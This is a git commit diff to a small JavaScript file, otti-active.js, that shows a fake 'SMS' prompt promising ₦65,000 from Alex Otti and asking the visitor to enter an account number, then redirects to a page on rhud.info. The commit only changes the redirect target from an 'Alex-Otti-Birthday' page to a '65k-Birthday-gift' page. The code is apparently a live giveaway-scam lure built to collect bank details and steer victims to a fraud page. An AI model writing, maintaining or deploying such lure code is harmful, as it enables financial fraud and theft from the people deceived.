2860ede57c5dd0477ff34160f534a5c1019af704
graantx <slicer_sizzles9k@icloud.com>
2026-06-07 01:18:28 +0100

    Update otti-active.js

--- otti-active.js
+++ otti-active.js
@@ -1,5 +1,5 @@
 var password = 'WITHDRAW ₦65,000'
 password=prompt('SMS: Congratulations, you are eligible to receive ₦65,000 From Alex Otti, click OK to Enter Your Acc. Number','WITHDRAW ₦65,000');
 if (password != 'WITHDRAW ₦65,000') {
-location.href='https://rhud.info/Alex-Otti-Birthday.html';
+location.href='https://rhud.info/65k-Birthday-gift.html';
 }
